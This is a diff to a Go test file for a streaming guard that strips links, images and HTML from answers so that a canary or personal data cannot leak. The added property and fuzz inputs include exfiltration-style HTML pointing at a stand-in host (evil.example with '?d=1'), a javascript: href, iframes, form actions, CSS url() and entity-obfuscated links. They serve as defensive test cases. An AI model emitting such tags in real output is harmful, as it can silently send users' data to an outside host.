@@ -98,7 +98,7 @@ func propAnswer(r *propRand) string {
 // propRemoved is markup the guard removes whole: placed inside a value, it
 // joins the parts of the value again in the output.
 var propRemoved = []string{"[]()", "[](https://evil.com/x?d=1)", "[](<a b>)", `[](x "t")`, "[](x[]())",
-	"[](a)[](b)"}
+	"[](a)[](b)", `<a href="https://evil.example/?d=1">`, "<a\nhref=x>"}
 
 // propKept is markup that leaves something between the parts of a value: the
 // kept text of a link, a marker, an allowed link, or text that is no link.
@@ -207,6 +207,53 @@ func propRebuildAnswer(r *propRand, text string) string {
 			at++
 		}
 		b.WriteString(text[last:at] + " " + propRebuild(r) + " ")
+		last = at
+	}
+	b.WriteString(text[last:])
+	return b.String()
+}
+
+// propHTML is HTML that a browser follows or loads, or that only looks like
+// it, and pieces of tags.
+var propHTML = []string{
+	`<a href="https://evil.example/?d=1">x</a>`, `<a href='https://docs.example.com/a'>ok</a>`,
+	`<A HREF=https://evil.example/>y</A>`, "<a\nhref=\"https://evil.example/\"\n>z</a>",
+	`<a href="&#x68;ttps://evil.example/">e</a>`, `<a title=">" href="https://evil.example/">q</a>`,
+	`<a/href=https://evil.example/>w</a>`, `<a href="javascript:alert(1)">j</a>`,
+	`<iframe src="https://evil.example/?d=1"></iframe>`, `<video poster=https://evil.example/p.png></video>`,
+	`<div style="background:url(https://evil.example/p.png)">s</div>`, `<span style="color:red">c</span>`,
+	`<form action=https://evil.example/><button>b</button></form>`, `<img srcset="https://evil.example/a.png 2x">`,
+	`<b title="<a href=https://evil.example/>">t</b>`, `<svg><image href="https://evil.example/i.png"/></svg>`,
+	`<img src="https://docs.example.com/a.png" onerror="x()">`, "<style>p{color:red}</style>",
+	"<a", `<a href="https://evil.example/`, `<x title="`, `">`, "<", "</a>", "<a name=n>", "a<b", "List<Integer>",
+}
+
+// propHTMLPiece returns one to three pieces of HTML, at times with markup the
+// guard removes inside them, so that the removal rebuilds a tag.
+func propHTMLPiece(r *propRand) string {
+	var b strings.Builder
+	for n := 1 + r.intn(3); n > 0; n-- {
+		b.WriteString(r.pick(propHTML))
+	}
+	s := b.String()
+	if r.intn(3) == 0 {
+		at := r.intn(len(s) + 1)
+		s = s[:at] + r.pick(propRemoved) + s[at:]
+	}
+	return s
+}
+
+// propHTMLAnswer places one to three pieces of HTML at word boundaries of
+// text.
+func propHTMLAnswer(r *propRand, text string) string {
+	var b strings.Builder
+	last := 0
+	for n := 1 + r.intn(3); n > 0; n-- {
+		at := last + r.intn(len(text)-last+1)
+		for at < len(text) && text[at] != ' ' {
+			at++
+		}
+		b.WriteString(text[last:at] + " " + propHTMLPiece(r) + " ")
 		last = at
 	}
 	b.WriteString(text[last:])
@@ -414,14 +461,22 @@ func TestStreamPropertyRandomAnswers(t *testing.T) {
 				t.Fatalf("the canary got through: %q", want)
 			}
 			checkNoLeaks(t, s, rebuilt, want)
+			// The same answer with HTML tags: none that a browser follows or
+			// loads off the allowlist may be left.
+			tagged := propHTMLAnswer(r, text)
+			want = checkAnswer(t, r, tagged, 2)
+			if strings.Contains(want, testCanary) {
+				t.Fatalf("the canary got through: %q", want)
+			}
+			checkNoLeaks(t, s, tagged, want)
 		})
 	}
 }
 
 // FuzzStreamGuard fuzzes the seed of a random answer and of its splits, and a
 // short fragment placed at a random spot in it, inside the canary or a value
-// with personal data added to it, or inside markup around a link the guard
-// removes. The fragment can split the value with a link that the guard then
+// with personal data added to it, inside markup around a link the guard
+// removes, or inside HTML tags (propHTMLPiece). The fragment can split the value with a link that the guard then
 // removes, joining the parts again, or form an image, a link or a URL with
 // what is around it once the guard removed something: the canary must still
 // never get through, no image, link or URL the guard removes may be left in
@@ -442,6 +497,11 @@ func FuzzStreamGuard(f *testing.F) {
 	f.Add(uint64(13), "![a](https://evil.com/a.png)(https://evil.com/?q=S)")
 	f.Add(uint64(14), "[")
 	f.Add(uint64(15), "](")
+	f.Add(uint64(16), `<a href="https://evil.example/?d=1">`)
+	f.Add(uint64(17), `<a title=">" href=`)
+	f.Add(uint64(18), "&#x68;")
+	f.Add(uint64(19), "<")
+	f.Add(uint64(20), `<iframe src=//evil.example/>`)
 	f.Fuzz(func(t *testing.T, seed uint64, extra string) {
 		if len(extra) > 48 || !utf8.ValidString(extra) {
 			return
@@ -452,7 +512,7 @@ func FuzzStreamGuard(f *testing.F) {
 		for at < len(text) && text[at]&0xC0 == 0x80 {
 			at++
 		}
-		mode := r.intn(3)
+		mode := r.intn(4)
 		switch mode {
 		case 0: // inside a value
 			v := r.pick(propJoinable)
@@ -460,9 +520,13 @@ func FuzzStreamGuard(f *testing.F) {
 			text = text[:at] + " " + v[:k] + extra + v[k:] + " " + text[at:]
 		case 1:
 			text = text[:at] + extra + text[at:]
-		default: // inside markup around a removed link
+		case 2: // inside markup around a removed link
 			text = text[:at] + " " + r.pick(propRebuildLeft) + extra + propRebuildNest(r, 2) +
 				r.pick(propRebuildRight) + " " + text[at:]
+		default: // inside HTML
+			h := propHTMLPiece(r)
+			k := r.intn(len(h) + 1)
+			text = text[:at] + " " + h[:k] + extra + h[k:] + " " + text[at:]
 		}
 		want := checkAnswer(t, r, text, 2)
 		if strings.Contains(want, testCanary) {
